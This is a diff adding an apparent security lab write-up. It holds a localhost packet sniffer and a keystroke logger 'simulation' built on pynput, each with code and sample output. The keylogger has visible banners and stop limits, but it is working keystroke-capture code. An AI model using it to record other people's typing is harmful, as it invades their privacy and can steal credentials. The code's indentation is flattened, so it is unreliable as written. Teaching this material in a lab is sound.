@@ -1,0 +1,147 @@
+
+Task 1  Network Traffic Analyzer:
+
+Code:
+
+
+import socket, struct, datetime
+# Parse IP Header (20 bytes)
+def parse_ip_header(data):
+iph = struct.unpack("!BBHHHBBH4s4s", data[:20])
+return iph[6], socket.inet_ntoa(iph[8]), socket.inet_ntoa(iph[9])
+# Parse TCP / UDP
+def parse_tcp(data): return struct.unpack("!HHLLBBHHH", data[:20])[:2]
+def parse_udp(data): return struct.unpack("!HHHH", data[:8])[:2]
+
+
+
+
+
+
+# Main Sniffer — Localhost only, 20 packets max
+def start_sniffer():
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+s.bind(("127.0.0.1", 0))
+s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+print("[*] Sniffer started on 127.0.0.1")
+count = 0
+while count < 20:
+raw, _ = s.recvfrom(65535)
+ts = datetime.datetime.now().strftime("%H:%M:%S")
+proto, src, dst = parse_ip_header(raw)
+transport = raw[(raw[0] & 0xF) * 4:]
+if proto == 6: sp,dp = parse_tcp(transport); label="TCP "
+elif proto == 17: sp,dp = parse_udp(transport); label="UDP "
+else: sp=dp=0; label="ICMP"
+print(f"[{ts}] {label} {src}:{sp} -> {dst}:{dp}")
+count += 1
+s.close()
+if __name__ == "__main__": start_sniffer()
+
+
+
+output: 
+[*] Sniffer started on 127.0.0.1
+-------------------------------------------------------
+[14:23:01] TCP 127.0.0.1:52341 → 127.0.0.1:80
+[14:23:01] TCP 127.0.0.1:80 → 127.0.0.1:52341
+[14:23:02] UDP 127.0.0.1:53 → 127.0.0.1:53421
+[14:23:03] TCP 127.0.0.1:52342 → 127.0.0.1:443
+[14:23:03] TCP 127.0.0.1:443 → 127.0.0.1:52342
+[14:23:04] ICMP 127.0.0.1 → 127.0.0.1
+... (20 packets captured, session complete)
+
+
+
+
+
+
+
+
+
+
+
+Task 2  Keystroke Logger Simulation:
+
+
+Code:
+
+
+# Install required library
+pip install pynput
+# Run the simulation (test terminal only)
+python keylogger_sim.py
+# Log file will be created at:
+keylog_output.txt (same directory)
+
+
+
+
+
+from pynput import keyboard
+import datetime
+import os
+LOG_FILE = "keylog_output.txt"
+MAX_KEYS = 200 # Safety limit — stops after 200 keys
+key_count = 0
+def write_log(text):
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+f.write(text)
+def on_press(key):
+global key_count
+ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+try:
+write_log(f"[{ts}] KEY: {key.char}\n")
+except AttributeError:
+# Special keys (Shift, Ctrl, Enter, etc.)
+write_log(f"[{ts}] SPECIAL: {key}\n")
+key_count += 1
+if key_count >= MAX_KEYS:
+print("[*] Max keys captured. Stopping.")
+return False # Stops listener
+def on_release(key):
+if key == keyboard.Key.esc:
+print("[*] ESC pressed — logging stopped.")
+return False # ESC exits cleanly
+# ■■■ Main ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+print("[SIMULATION] Keystroke Logger Active")
+print("[INFO] Press ESC to stop. Max 200 keystrokes.")
+print("[INFO] All keys logged to: keylog_output.txt")
+print("-" * 50)
+write_log(f"\n=== Session: {datetime.datetime.now()} ===\n")
+with keyboard.Listener(
+on_press=on_press,
+on_release=on_release) as listener:
+listener.join()
+print(f"[*] Log saved to {os.path.abspath(LOG_FILE)}")
+
+
+
+[SIMULATION] Keystroke Logger Active
+[INFO] Press ESC to stop. Max 200 keystrokes.
+[INFO] All keys logged to: keylog_output.txt
+--------------------------------------------------
+[*] Listener started successfully.
+... (typing in test window) ...
+[*] ESC pressed — logging stopped.
+[*] Log saved to C:\Users\Zaid\keylog_output.txt
+
+
+
+
+
+Output:
+=== Session: 2025-04-26 14:30:00 ===
+[2025-04-26 14:30:05] KEY: h
+[2025-04-26 14:30:05] KEY: e
+[2025-04-26 14:30:05] KEY: l
+[2025-04-26 14:30:05] KEY: l
+[2025-04-26 14:30:05] KEY: o
+[2025-04-26 14:30:06] SPECIAL: Key.space
+[2025-04-26 14:30:06] KEY: w
+[2025-04-26 14:30:06] KEY: o
+[2025-04-26 14:30:06] KEY: r
+[2025-04-26 14:30:06] KEY: l
+[2025-04-26 14:30:06] KEY: d
+[2025-04-26 14:30:07] SPECIAL: Key.enter
+... 188 more keystrokes ...
